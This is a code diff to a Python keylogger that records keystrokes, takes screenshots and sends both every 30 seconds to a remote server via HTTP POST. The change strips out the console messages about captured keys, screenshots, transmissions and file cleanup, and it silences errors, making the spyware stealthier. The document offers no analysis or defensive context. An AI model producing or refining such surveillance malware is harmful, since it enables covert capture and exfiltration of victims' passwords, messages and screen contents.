@@ -20,10 +20,8 @@ def log_keystroke(key):
     """Capture keystrokes and buffer them for sending."""
     try:
         buffered_keys.append(key.char)
-        print(f"[KEY] {key.char}")  # show in console
     except AttributeError:
         buffered_keys.append(f"[{key}]")
-        print(f"[KEY] [{key}]")  # show special keys
 
 def take_screenshot():
     """Take a screenshot and save it temporarily."""
@@ -31,10 +29,8 @@ def take_screenshot():
         filename = f"screenshot_{int(time.time())}.png"
         image = ImageGrab.grab()
         image.save(filename)
-        print(f"[SCREENSHOT] Captured {filename}")
         return filename
-    except Exception as e:
-        print(f"[ERROR] Screenshot failed: {e}")
+    except Exception:
         return None
 
 # ------------------ Data Transfer ------------------
@@ -53,7 +49,7 @@ def send_data():
                 files["screenshot"] = open(screenshot_path, "rb")
 
             try:
-                response = requests.post(
+                requests.post(
                     SERVER_URL,
                     data={
                         "client_id": CLIENT_ID,
@@ -62,17 +58,12 @@ def send_data():
                     files=files,
                     timeout=5
                 )
-                print(f"[SENT] Data sent to server (status {response.status_code})")
-            except Exception as e:
-                print(f"[ERROR] Failed to send data: {e}")
+            except Exception:
+                pass
 
             if files:
                 files["screenshot"].close()
                 os.remove(screenshot_path)
-                print(f"[CLEANUP] Deleted local {screenshot_path}")
-
-        else:
-            print("[INFO] Nothing to send this cycle")
 
         time.sleep(30)  # Send every 30 seconds
 
@@ -81,7 +72,7 @@ def send_data():
 def start_keylogger():
     listener = keyboard.Listener(on_press=log_keystroke)
     listener.start()
-    print("[START] Keylogger started. Capturing data...")
+    print("[INFO] Process started. Capturing data and sending to server...")
 
 if __name__ == "__main__":
     threading.Thread(target=send_data, daemon=True).start()
